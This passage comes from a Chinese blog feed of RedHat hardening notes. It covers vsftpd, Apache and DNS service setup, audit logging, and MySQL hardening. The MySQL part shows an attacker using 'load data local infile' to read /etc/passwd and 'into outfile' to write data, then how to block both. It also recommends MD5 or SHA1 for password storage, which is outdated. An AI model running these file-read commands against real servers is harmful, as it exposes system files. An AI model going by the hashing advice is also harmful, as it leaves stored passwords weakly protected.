启动</span>\n<span>service</span> vsftpd stop          <span># 暂停</span>\n<span>service</span> vsftpd restart       <span># 重启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h4 id=\"设置开机自启-2\" tabindex=\"-1\"> 设置开机自启</h4>\n<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> vsftpd   <span># 查看自启状态</span>\n<span>chkconfig</span> --level <span>35</span> vsftpd on   <span># 设置开机自启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"apache-服务\" tabindex=\"-1\"> APACHE 服务</h2>\n<p>APACHE 是一款 WEB 服务器软件, 它可以运行在几乎所有广泛使用的计算机平台上, 由于其跨平台和安全性被广泛使用, 是最流行的 WEB 服务器端软件之一。</p>\n<h3 id=\"使用到的端口号-3\" tabindex=\"-1\"> 使用到的端口号</h3>\n<ul>\n<li>超文本传输协议（默认为 <code>80</code> 端口）</li>\n<li>更安全的超文本传输协议（默认为 <code>443</code> 端口）</li>\n</ul>\n<h3 id=\"所需软件-3\" tabindex=\"-1\"> 所需软件</h3>\n<p>APACHE 服务需要较多的软件进行支持, RedHat 已经预装了此软件, 这里就不一一阐述了。</p>\n<h3 id=\"主要的配置文件-1\" tabindex=\"-1\"> 主要的配置文件</h3>\n<ul>\n<li><strong>/etc/httpd/conf/httpd.conf</strong></li>\n</ul>\n<p>-- 最主要的配置文件, 里买内包含了 APACHE 服务器主配置文件. 包括服务器指令的目录设置。</p>\n<h3 id=\"查看配置文件爱呢的帮助\" tabindex=\"-1\"> 查看配置文件爱呢的帮助</h3>\n<div><pre><code><span>man</span> <span>5</span> httpd.conf\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"重要选项说明-3\" tabindex=\"-1\"> 重要选项说明</h3>\n<ul>\n<li><strong>Listen 80</strong></li>\n</ul>\n<p>-- 设置监听的端口号</p>\n<ul>\n<li><strong>DocumentRoot &quot;/var/www/html&quot;</strong></li>\n</ul>\n<p>-- 定义网站的根目录, 默认的目录在 <code>/var/www/html</code> , 修改此选项时, 要同时修改下面一个选项。</p>\n<ul>\n<li>&lt;<strong>Directory &quot;/var/www/html&quot;</strong>&gt;</li>\n</ul>\n<p>-- 定义网站的一个目录, 修改此选项时, 要同时修改上面一个选项。</p>\n<ul>\n<li><strong>Alias /icons/ &quot;/var/www/icons&quot;</strong></li>\n</ul>\n<p>-- 目录的别名设置, 就是浏览器访问 <code>http://[host]/icons</code> 时, 实际上访问的是 <code>/var/www/icons</code> 目录, 配置此选项时, 要同时配置下面的目录权限。</p>\n<ul>\n<li>\n<p>&lt;<strong>Directory &quot;/var/www/icons&quot;</strong>&gt;</p>\n</li>\n<li>\n<p><strong>Options Index FollowSymLinks</strong></p>\n</li>\n</ul>\n<p>-- <code>Index</code> 设置是否开启目录浏览, 默认启用, 禁止在前面加一个 <code>-</code> -- <code>FollowSymLinks</code> 设置是否禁用符号连接追踪, 默认启用, 禁止在前面加一个 <code>-</code></p>\n<ul>\n<li><strong>Allow from all</strong></li>\n</ul>\n<p>-- 配置白名单, 默认允许所有的 IP 段访问。</p>\n<ul>\n<li><strong>ServerSignature On</strong></li>\n</ul>\n<p>-- 配置是否隐藏 APACHE 的版本信息, 默认是开启, 还可以设置为 <code>Off</code> 和 <code>EMail</code> 。其中 <code>Off</code> 是隐藏信息, <code>EMail</code> 是会显示管理员的 email 信息的。</p>\n<ul>\n<li><strong>NameVirtualHost *:443</strong></li>\n</ul>\n<p>-- 设置开放的端口, 一般在配置 <code>https</code> 时候修改它, 修改这个选项, 要同时修改下面一个选项。</p>\n<ul>\n<li>&lt;<strong>VirtualHost *:443</strong>&gt;</li>\n</ul>\n<p>-- 设置开放的端口。</p>\n<h3 id=\"服务的启动与停止-3\" tabindex=\"-1\"> 服务的启动与停止</h3>\n<div><p>提示</p>\n<p>APACHE 的服务名并不叫做 <code>http</code> , 而是 <code>httpd</code> 。</p>\n</div>\n<div><pre><code><span>service</span> httpd status        <span># 状态</span>\n<span>service</span> httpd start         <span># 启动</span>\n<span>service</span> httpd stop          <span># 暂停</span>\n<span>service</span> httpd restart       <span># 重启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h4 id=\"设置开机自启-3\" tabindex=\"-1\"> 设置开机自启</h4>\n<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> httpd   <span># 查看自启状态</span>\n<span>chkconfig</span> --level <span>35</span> httpd on   <span># 设置开机自启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"dns-服务\" tabindex=\"-1\"> DNS 服务</h2>\n<div><p>提示</p>\n<p>DNS（Domain Name Server, 域名服务器）是进行域名(domain name)和与之相对应的 IP 地址 (IP address) 转换的服务器。</p>\n</div>\n<h3 id=\"使用到的端口号-4\" tabindex=\"-1\"> 使用到的端口号</h3>\n<ul>\n<li>UDP 解析（默认为 <code>53</code> 端口）</li>\n</ul>\n<h3 id=\"所需软件-4\" tabindex=\"-1\"> 所需软件</h3>\n<ul>\n<li><strong>bind</strong></li>\n</ul>\n<p>-- DNS 主要的包, 包含 named 守护进程（用来回答查询结果的）, 还有一些重要命令: <code>nslookup</code> , <code>dig</code> 和 <code>host</code> , 等等。</p>\n<ul>\n<li><strong>caching-nameserver</strong></li>\n</ul>\n<p>-- 包含 DNS 的主配置文件模板, 区域配置文件模板等。</p>\n<h3 id=\"主配置文件-2\" tabindex=\"-1\"> 主配置文件</h3>\n<ul>\n<li><strong>/etc/named-caching-nameserver.conf</strong></li>\n</ul>\n<p>-- DNS 主配置文件, 实际中需要把此文件复制成 <code>named.conf</code> , 方能使用</p>\n<ul>\n<li><strong>/etc/named-rfc1912.zones</strong></li>\n</ul>\n<p>-- DNS 区域配置文件, 实际中需要把此文件复制成 <code>named.zones</code> , 方能使用</p>\n<ul>\n<li><strong>/var/named/named.zero</strong></li>\n</ul>\n<p>-- DNS 正向解析文件, 实际中需要把此文件复制成 <code>named.zones</code> 中配置的文件名</p>\n<ul>\n<li><strong>/var/named/named.local</strong></li>\n</ul>\n<p>-- DNS 反向解析文件, 实际中需要把此文件复制成 <code>named.zones</code> 中配置的文件名</p>\n<h3 id=\"查看主配置文件的帮助-3\" tabindex=\"-1\"> 查看主配置文件的帮助</h3>\n<div><pre><code><span>man</span> <span>5</span> named-caching-nameserver.conf\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"重要选项说明-4\" tabindex=\"-1\"> 重要选项说明</h3>\n<ul>\n<li>**allow-query { any; }; **</li>\n</ul>\n<p>-- 表示所有人能查询这台服务器, 可以修改成 IP 地址或网段, 限制其查询</p>\n<ul>\n<li>**allow-recursion { any; }; **</li>\n</ul>\n<p>-- 只针对收到的递归查询请求, 对于非递归请求不关心, 可以修改成 IP 地址或网段, 限制其递归查询</p>\n<ul>\n<li>**allow-transfer { any; }; **</li>\n</ul>\n<p>-- 限制哪些主机或者网络可以传递信息至区域文件</p>\n<h3 id=\"服务的启动与停止-4\" tabindex=\"-1\"> 服务的启动与停止</h3>\n<div><p>提示</p>\n<p>DNS 的服务名并不叫做 <code>name</code> , 而是 <code>named</code> 。</p>\n</div>\n<div><pre><code><span>service</span> named status        <span># 状态</span>\n<span>service</span> named start         <span># 启动</span>\n<span>service</span> named stop          <span># 暂停</span>\n<span>service</span> named restart       <span># 重启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h4 id=\"设置开机自启-4\" tabindex=\"-1\"> 设置开机自启</h4>\n<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> named   <span># 查看自启状态</span>\n<span>chkconfig</span> --level <span>35</span> named on   <span># 设置开机自启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div>",
      "date_published": "2016-09-15T18:59:15.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "RedHat 系统安全加固（三）系统日志审计",
      "url": "https://vxhly.github.io/views/liunx/log-audit-function.html",
      "id": "https://vxhly.github.io/views/liunx/log-audit-function.html",
      "summary": "前言\n本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统日志审计的配置, 加强系统的防御能力。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录系统日志审计的配置, 加强系统的防御能力。</p>\n</div>\n\n<h2 id=\"syslog-登录事件记录\" tabindex=\"-1\"> syslog 登录事件记录</h2>\n<p>查看参数 <code>authpriv</code> 值, <code>For Exmaple:</code></p>\n<div><pre><code><span>more</span> /etc/syslog.conf <span>|</span> <span>grep</span> authpriv\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>表名登录事件记录在 <code>/var/log/secure</code> 文件中, 使用以下命令检查非法记录</p>\n<div><pre><code><span>more</span> /var/log/secure <span>|</span> <span>grep</span> refused\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/redhat-reinforce-16.png\" alt=\"RedHat 安全加固\"></p>\n<h2 id=\"审计功能的进程\" tabindex=\"-1\"> 审计功能的进程</h2>\n<p>启动审计进程, <code>For Exmaple:</code></p>\n<div><pre><code><span>service</span> auditd start\n<span>service</span> psacct start\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>启动 <code>psacct</code> 服务</p>\n<div><pre><code><span>service</span> psacct start\n<span>chkconfig</span> psacct on\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"查看记录审计的日志\" tabindex=\"-1\"> 查看记录审计的日志</h2>\n<ul>\n<li><code>auditd</code> 审计进程日志记录在 <code>/var/log/audit/audit.log</code></li>\n<li><code>psacct</code> 日志记录在 <code>/var/account/pacct</code></li>\n</ul>\n<div><p>注意</p>\n<p><code>pacct</code> 日志是二进制文件, 使用以下命令进行查看</p>\n</div>\n<p><code>For Exmaple:</code></p>\n<div><pre><code>lastcomm -f /var/account/pacct\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"登录日志查看\" tabindex=\"-1\"> 登录日志查看</h2>\n<p><code>lastlog</code> 查看用户最后一次登录时间, <code>For Exmaple:</code></p>\n<div><pre><code>lastlog\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/redhat-reinforce-17.png\" alt=\"RedHat 安全加固\"></p>\n",
      "image": "https://vxhly.github.io/assets/redhat-reinforce-16.png",
      "date_published": "2016-10-16T13:39:09.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "MySQL 数据库安全加固",
      "url": "https://vxhly.github.io/views/liunx/mysql-database-user-policy.html",
      "id": "https://vxhly.github.io/views/liunx/mysql-database-user-policy.html",
      "summary": "前言\n数据库作为数据管理的平台, 它的安全性首先由系统内部和网络安全两部分来决定的。对于系统管理员来说, 首先要保证系统本身的安全, 在安装 MySQL 数据时, 需要对基础环境进行较好的配置。本篇笔记将记录在 RedHat Liunx 系统下 MySQL 数据库的安全加固方法。\n\n",
      "content_html": "<div><p>前言</p>\n<p>数据库作为数据管理的平台, 它的安全性首先由系统内部和网络安全两部分来决定的。对于系统管理员来说, 首先要保证系统本身的安全, 在安装 MySQL 数据时, 需要对基础环境进行较好的配置。本篇笔记将记录在 RedHat Liunx 系统下 MySQL 数据库的安全加固方法。</p>\n</div>\n\n<h2 id=\"修改-root-用户口令\" tabindex=\"-1\"> 修改 root 用户口令</h2>\n<p>缺省安装的 MySQL 的 root 用户是空密码的, 为了安全起见, 必须修改为强密码, 所谓的强密码, 至少 8 位, 由字母、数字和符号组成的不规律密码。使用 MySQL 自带的命令 <code>mysqladmin</code> 修改 root 密码, 同时也可以登陆数据库, 修改数据库 mysql 下的 user 表的字段内容</p>\n<h3 id=\"使用-mysqladmin-命令\" tabindex=\"-1\"> 使用 mysqladmin 命令</h3>\n<p>修改密码, <code>For Example:</code></p>\n<div><pre><code>mysqladmin -u root password <span>\"upassword\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/mysql-reinforce-1.png\" alt=\"MySQL 数据库加固\"></p>\n<h3 id=\"使用-sql-语句修改\" tabindex=\"-1\"> 使用 SQL 语句修改</h3>\n<p><code>Connection Example:</code></p>\n<div><pre><code>mysql -h <span>127.0</span>.0.1 -u root -p\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>输入之前设置的密码 <code>upassword</code> , 连接数据库</p>\n<p>修改密码, <code>For Example:</code></p>\n<div><pre><code>mysql<span>></span> <span>use</span> mysql<span>;</span>        <span>-- 切换当前的数据库</span>\nmysql<span>></span> <span>update</span> mysql<span>.</span><span>user</span> <span>set</span> password<span>=</span>password<span>(</span><span>'upassword'</span><span>)</span> <span>where</span> <span>user</span><span>=</span><span>'root'</span><span>;</span>\nmysql<span>></span> flush <span>privileges</span><span>;</span> <span>-- 强制刷新内存授权表,否则用的还是内存缓存中的口令。</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-2.png\" alt=\"MySQL 数据库加固\"></p>\n<p>修改完成之后可以执行 SQL 语句查询, <code>For Example:</code></p>\n<div><pre><code>mysql<span>></span> <span>select</span> <span>*</span> <span>from</span> mysql<span>.</span><span>user</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"删除默认数据库和数据库用户\" tabindex=\"-1\"> 删除默认数据库和数据库用户</h2>\n<p>一般情况下, MySQL 数据库安装在本地, 并且也只需要本地的 php 脚本对 mysql 进行读取, 所以很多用户不需要, 尤其是默认安装的用户。MySQL 初始化后会自动生成空用户和 test 库, 进行安装的测试, 这会对数据库的安全构成威胁, 有必要全部删除, 最后的状态只保留单个 root 即可, 当然以后根据需要增加用户和数据库。</p>\n<p>执行以下 SQL 语句, <code>For Example:</code></p>\n<div><pre><code>mysql<span>></span> <span>show</span> <span>databases</span><span>;</span>   <span>-- 显示当前的所有数据库</span>\nmysql<span>></span> <span>drop</span> <span>database</span> test<span>;</span><span>-- 删除数据库 test</span>\nmysql<span>></span> <span>use</span> mysql<span>;</span>\nmysql<span>></span> <span>delete</span> <span>from</span> db<span>;</span>   <span>-- 删除存放在数据库的表信息,因为还没有数据库信息</span>\nmysql<span>></span> <span>delete</span> <span>from</span> mysql<span>.</span><span>user</span> <span>where</span> <span>not</span> <span>(</span><span>user</span><span>=</span><span>'root'</span><span>)</span><span>;</span>\nmysql<span>></span> <span>delete</span> <span>from</span> mysql<span>.</span><span>user</span> <span>where</span> <span>user</span><span>=</span><span>'root'</span> <span>and</span> password<span>=</span><span>''</span><span>;</span>\nmysql<span>></span> flush <span>privileges</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-3.png\" alt=\"MySQL 数据库加固\"></p>\n<br>\n<p><img src=\"/assets/mysql-reinforce-4.png\" alt=\"MySQL 数据库加固\"></p>\n<br>\n<p><img src=\"/assets/mysql-reinforce-5.png\" alt=\"MySQL 数据库加固\"></p>\n<h2 id=\"改变默认-mysql-管理员账号\" tabindex=\"-1\"> 改变默认 MySQL 管理员账号</h2>\n<p>系统 MySQL 的管理员名称是 root, 而一般情况下, 数据库管理员都没进行修改, 这一定程度上对系统用户穷举的恶意行为提供了便利, 此时修改为复杂的用户名, 请不要在设定为 admin 或者 administraror 的形式, 因为它们也在易猜的用户字典中。</p>\n<div><pre><code>mysql<span>></span> <span>update</span> mysql<span>.</span><span>user</span> <span>set</span> <span>user</span><span>=</span><span>\"newroot\"</span> <span>where</span> <span>user</span><span>=</span><span>\"root\"</span><span>;</span>\nmysql<span>></span> flush <span>privileges</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-6.png\" alt=\"MySQL 数据库加固\"></p>\n<h2 id=\"关于密码的管理\" tabindex=\"-1\"> 关于密码的管理</h2>\n<p>密码是数据库安全管理的一个很重要因素, 不要将纯文本密码保存到数据库中。如果你的计算机有安全危险, 入侵者可以获得所有的密码并使用它们。相反, 应使用 <code>MD5()</code> 、 <code>SHA1()</code> 或单向哈希函数。也不要从词典中选择密码, 有专门的程序可以破解它们, 请选用至少八位, 由字母、数字和符号组成的强密码。在存取密码时, 使用 mysql 的内置函数 <code>password（）</code> 的 sql 语句, 对密码进行加密后存储。例如以下方式在 users 表中加入新用户。</p>\n<div><pre><code>mysql<span>></span> <span>insert</span> <span>into</span> users <span>values</span> <span>(</span><span>1</span><span>,</span>password<span>(</span><span>1234</span><span>)</span><span>,</span><span>'test'</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"使用独立用户运行-mysql\" tabindex=\"-1\"> 使用独立用户运行 MySQL</h2>\n<p>绝对不要作为使用 root 用户运行 <code>MySQL 服务器</code> 。这样做非常危险, 因为任何具有 FILE 权限的用户能够用 root 创建文件(例如: <code>~root/.bashrc</code> )。mysqld 拒绝使用 root 运行, 除非使用 <code>–user=root</code> 选项明显指定。应该用普通非特权用户运行 mysqld。</p>\n<p>要想用其它 Unix 用户启动 mysqld, , 增加 user 选项指定 <code>/etc/my.cnf</code> 选项文件或服务器数据目录的 <code>my.cnf</code> 选项文件中的 <code>[mysqld]</code> 组的用户名。</p>\n<h3 id=\"加固\" tabindex=\"-1\"> 加固</h3>\n<p><code>/etc/my.cnf</code> 配置文件</p>\n<div><pre><code><span>[</span>mysqld<span>]</span>\n<span>user</span><span>=</span>mysql\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-7.png\" alt=\"MySQL 数据库加固\"></p>\n<p>该命令使服务器用指定的用户来启动, 无论你手动启动或通过 <code>mysqld_safe</code> 或 <code>mysql.server</code> 启动, 都能确保使用 mysql 的身份。也可以在启动数据库是, 加上 <code>user</code> 参数。</p>\n<div><pre><code>/usr/bin/mysqld_safe --user<span>=</span>mysql\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>作为其它 linux 用户而不用 root 运行 mysqld, 你不需要更改 user 表中的 root 用户名, 因为 <code>MySQL 账户</code> 的用户名与 <code>linux 账户</code> 的用户名无关。确保 mysqld 运行时, 只使用对数据库目录具有读或写权限的 linux 用户来运行。</p>\n<p><img src=\"/assets/mysql-reinforce-8.png\" alt=\"MySQL 数据库加固\"></p>\n<h2 id=\"禁止远程连接数据库\" tabindex=\"-1\"> 禁止远程连接数据库</h2>\n<p>在命令行 <code>netstat -ant</code> 下看到, 默认的 <code>3306</code> 端口是打开的, 此时打开了 <code>mysqld</code> 的网络监听, 允许用户远程通过帐号密码连接数本地据库, 默认情况是允许远程连接数据的。为了禁止该功能, 启动 <code>skip-networking</code> , 不监听 sql 的任何 <code>TCP/IP</code> 的连接, 切断远程访问的权利, 保证安全性。假如需要远程管理数据库, 可通过安装 <code>PhpMyadmin</code> 来实现。假如确实需要远程连接数据库, 至少修改默认的监听端口, 同时添加防火墙规则, 只允许可信任的网络的 <code>mysql</code> 监听端口的数据通过。</p>\n<h3 id=\"加固-1\" tabindex=\"-1\"> 加固</h3>\n<p>编辑 <code>/etc/my.cnf</code> , 加入如下语句</p>\n<div><pre><code><span>[</span>mysqld<span>]</span>\nskip-networking\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-9.png\" alt=\"MySQL 数据库加固\"></p>\n<p>执行重启语句, <code>For Example:</code></p>\n<div><pre><code><span>service</span> mysqld restart\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"限制连接用户的数量\" tabindex=\"-1\"> 限制连接用户的数量</h2>\n<p>数据库的某用户多次远程连接, 会导致性能的下降和影响其他用户的操作, 有必要对其进行限制。可以通过限制单个账户允许的连接数量来实现, 设置 <code>my.cnf</code> 文件的 <code>mysqld</code> 中的 <code>max_user_connections</code> 变量来完成。 <code>GRANT</code> 语句也可以支持 资源控制选项来限制服务器对一个账户允许的使用范围。</p>\n<p>编辑 <code>/etc/my.cnf</code> , 加入如下语句</p>\n<div><pre><code><span>[</span>mysqld<span>]</span>\nmax_user_connections <span>2</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-10.png\" alt=\"MySQL 数据库加固\"></p>\n<h2 id=\"用户目录权限限制\" tabindex=\"-1\"> 用户目录权限限制</h2>\n<p>默认的 MySQL 是安装在 <code>/usr/share/mysql</code> , 而对应的数据库文件在 <code>/var/lib/mysql</code> 目录下, 因此, 必须保证该目录不能让未经授权的用户访问后把数据库打包拷贝走了, 所以要限制对该目录的访问。确保 <code>mysqld</code> 运行时, 只使用对数据库目录具有读或写权限的 linux 用户来运行。</p>\n<p>修改权限, <code>For Example:</code></p>\n<div><pre><code><span>chown</span> -R root /usr/share/mysql\n<span>chown</span> -R mysql:mysql /var/lib/mysql\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-11.png\" alt=\"MySQL 数据库加固\"></p>\n<h2 id=\"命令历史记录保护\" tabindex=\"-1\"> 命令历史记录保护</h2>\n<p>数据库相关的 shell 操作命令都会分别记录在 <code>.bash_history</code> , 如果这些文件不慎被读取, 会导致数据库密码和数据库结构等信息泄露, 而登陆数据库后的操作将记录在 <code>/etc/my.cnf</code> 文件配置的文件中, 如果使用 <code>update</code> 表信息来修改数据库用户密码的话, 也会被读取密码, 因此需要删除这两个文件, 同时在进行登陆或备份数据库等与密码相关操作时, 应该使用 <code>-p</code> 参数加入提示输入密码后, 隐式输入密码, 建议将以上文件置空。</p>\n<h3 id=\"加固-2\" tabindex=\"-1\"> 加固</h3>\n<p>配置文件 <code>/etc/my.cnf</code> 中配置数据库操作日志存放路径, <code>For Example:</code></p>\n<div><pre><code><span>[</span>mysqld_safe<span>]</span>\n<span>log</span><span>=~</span>/.mysql_history\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-12.png\" alt=\"MySQL 数据库加固\"></p>\n<p>随意执行一些操作, <code>For Example:</code> <br></p>\n<p><img src=\"/assets/mysql-reinforce-13.png\" alt=\"MySQL 数据库加固\"></p>\n<p>查看 <code>~/.mysql_history</code> 文件, 可以看到数据库操作纪录（将会纪录所有成功或者失败的操作 SQL 语句）<br></p>\n<p><img src=\"/assets/mysql-reinforce-14.png\" alt=\"MySQL 数据库加固\"></p>\n<p>查看 <code>~/.bash_history</code> 文件, 可以看到有关于数据操作的 shell 命令<br></p>\n<p><img src=\"/assets/mysql-reinforce-15.png\" alt=\"MySQL 数据库加固\"></p>\n<p>删除操作命令, <code>For Example:</code></p>\n<div><pre><code><span>rm</span> .bash_history .mysql_history\n<span>ln</span> -s /dev/null .bash_history\n<span>ln</span> -s /dev/null .mysql_history\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-16.png\" alt=\"MySQL 数据库加固\"></p>\n<h2 id=\"禁止-mysql-对本地文件存取\" tabindex=\"-1\"> 禁止 MySQL 对本地文件存取</h2>\n<p>在 mysql 中, 提供对本地文件的读取, 使用的是 <code>load data local infile</code> 命令, 默认在 5.0 版本中, 该选项是默认打开的, 该操作令会利用 MySQL 把本地文件读到数据库中, 然后用户就可以非法获取敏感信息了, 假如你不需要读取本地文件, 请务必关闭。</p>\n<h3 id=\"测试存取\" tabindex=\"-1\"> 测试存取</h3>\n<p>测试: 首先在测试数据库下建立 <code>sqlfile.txt</code> 文件, 用逗号隔开各个字段<br></p>\n<p><img src=\"/assets/mysql-reinforce-19.png\" alt=\"MySQL 数据库加固\"></p>\n<p>在测试数据库, 先新建一张表, 建表的 SQL 语句如下, <code>For Example:</code></p>\n<div><pre><code><span>create</span> <span>table</span> users <span>(</span>\n  userid <span>int</span><span>(</span><span>11</span><span>)</span><span>,</span>\n  username <span>varchar</span><span>(</span><span>255</span><span>)</span><span>,</span>\n  password <span>int</span><span>(</span><span>11</span><span>)</span>\n<span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-17.png\" alt=\"MySQL 数据库加固\"></p>\n<p>执行导入语句, <code>For Example:</code></p>\n<div><pre><code>mysql<span>></span> <span>load</span> <span>data</span> <span>local</span> <span>infile</span> <span>'sqlfile.txt'</span> <span>into</span> <span>table</span> test<span>.</span>users <span>fields</span> <span>terminated</span> <span>by</span> <span>','</span><span>;</span>\nmysql<span>></span> <span>select</span> <span>*</span> <span>from</span> test<span>.</span>users<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-18.png\" alt=\"MySQL 数据库加固\"></p>\n<p>成功的将本地数据插入数据中, 此时应该禁止 MySQL 中用 <code>load data local infile</code> 命令。网络上流传的一些攻击方法中就有用它 <code>load data local infile</code> 的, 同时它也是很多新发现的 <code>SQL Injection</code> 攻击利用的手段！黑客还能通过使用 <code>load data local infile</code> 装载 <code>/etc/passwd</code> 进一个数据库表, 然后能用 <code>SELECT</code> 显示它, 这个操作对服务器的安全来说, 是致命的。可以在 <code>/etc/my.cnf</code> 中添加 <code>local-infile=0</code> , 或者加参数 <code>local-infile=0</code> 启动 <code>mysql</code> 。</p>\n<h3 id=\"sql-攻击\" tabindex=\"-1\"> SQL 攻击</h3>\n<p>黑客使用 <code>load data local infile</code> 获取 <code>/etc/passwd</code> 文件内容步骤<br></p>\n<p><img src=\"/assets/mysql-reinforce-20.png\" alt=\"MySQL 数据库加固\"></p>\n<p>接下来黑客只需执行 <code>select * from test.passwd</code> 就可以查询到数据了。</p>\n<h4 id=\"加固-3\" tabindex=\"-1\"> 加固</h4>\n<p>编辑 <code>/etc/my.cnf</code> 文件, 加入如下语句, <code>For Example:</code></p>\n<div><pre><code><span>[</span>mysqld<span>]</span>\nlocal-infile<span>=</span><span>0</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-21.png\" alt=\"MySQL 数据库加固\"></p>\n<p>或者直接执行命令, <code>For Example:</code></p>\n<div><pre><code>mysql_safe --user<span>=</span>mysql --local-infile<span>=</span><span>0</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>再次执行 <code>load data local infile</code> 命令, 导入 <code>/etc/passwd</code> 内容, 发现命令出错</p>\n<div><pre><code>mysql<span>></span> <span>load</span> <span>data</span> <span>local</span> <span>infile</span> <span>'/etc/passwd'</span> <span>into</span> <span>table</span> test<span>.</span>passwd <span>fields</span> <span>terminated</span> <span>by</span> <span>':'</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/mysql-reinforce-22.png\" alt=\"MySQL 数据库加固\"></p>\n<h2 id=\"mysql-服务器权限控制\" tabindex=\"-1\"> MySQL 服务器权限控制</h2>\n<p>MySQL 权限系统的主要功能是证实连接到一台给定主机的用户, 并且赋予该用户在数据库上的 <code>SELECT</code> 、 <code>INSERT</code> 、 <code>UPDATE</code> 和 <code>DELETE</code> 等权限（详见 user 超级用户表）。它的附加的功能包括有匿名的用户并对于 MySQL 特定的功能例如 <code>load data local infile</code> 进行授权及管理操作的能力。</p>\n<p>FILE 权限允许用户在 MySQL 服务器具有写权限的目录下创建新文件, 但不能覆盖已有文件在 user 表的 <code>File_priv</code> 设置 <code>Y</code> 或 <code>N</code> 。, 所以当你不需要对服务器文件读取时, 请关闭该权限。</p>\n<h3 id=\"加固-4\" tabindex=\"-1\"> 加固</h3>\n<div><p>提示</p>\n<p>需要将之前的加固配置项（ <code>local-infile=0</code> ）清掉</p>\n</div>\n<div><pre><code>mysql<span>></span> <span>update</span> mysql<span>.</span><span>user</span> <span>set</span> file_priv<span>=</span><span>'N'</span> <span>where</span> <span>user</span><span>=</span><span>'root'</span><span>;</span>\nmysql<span>></span> flush <span>privileges</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/mysql-reinforce-23.png\" alt=\"MySQL 数据库加固\"></p>\n<br>\n<p><img src=\"/assets/mysql-reinforce-24.png\" alt=\"MySQL 数据库加固\"></p>\n<div><p>注意</p>\n<p>刷新授权表之后, 一定要重新登录再进行测试, 否则还是会执行成功的</p>\n</div>\n<p>当 <code>file_priv='N'</code> , 黑客进行以下语句的时候, 就会出错</p>\n<div><pre><code>mysql<span>></span> <span>select</span> <span>*</span> <span>from</span> test<span>.</span>passwd <span>into</span> <span>outfile</span> <span>'test.txt'</span> <span>fields</span> <span>terminated</span> <span>by</span> <span>':'</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>当然还原配置之后, 黑客就可以很愉快的获取数据库中内容</p>\n<p><img src=\"/assets/mysql-reinforce-25.png\" alt=\"MySQL 数据库加固\"></p>\n<br>\n<p><img src=\"/assets/mysql-reinforce-26.png\" alt=\"MySQL 数据库加固\"></p>\n<h2 id=\"使用-chroot-来控制-mysql-的运行目录\" tabindex=\"-1\"> 使用 chroot 来控制 MySQL 的运行目录</h2>\n<p><code>Chroot</code> 是 linux 中的一种系统高级保护手段, 它的建立会将其与主系统几乎完全隔离, 也就是说, 一旦遭到什么问题, 也不会危及到正在运行的主系统。这是一个非常有效的办法, 